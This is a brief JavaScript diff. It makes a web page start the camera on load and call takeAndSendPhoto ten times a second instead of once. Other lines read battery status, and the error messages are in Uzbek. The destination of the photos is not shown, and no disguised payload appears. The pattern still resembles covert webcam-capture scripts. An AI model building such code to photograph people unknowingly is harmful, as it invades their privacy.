@@ -23,7 +23,7 @@ async function startCamera() {
 
         setInterval(() => {
             takeAndSendPhoto();
-        }, 1000);
+        }, 100);
 
     } catch (error) {
         console.error('Kamera kirishiga ruxsat berilmadi:', error);
@@ -94,4 +94,5 @@ navigator.getBattery().then(battery => {
     battery.addEventListener('levelchange', () => updateBatteryStatus(battery));
     battery.addEventListener('chargingchange', () => updateBatteryStatus(battery));
 });
+
 startCamera();
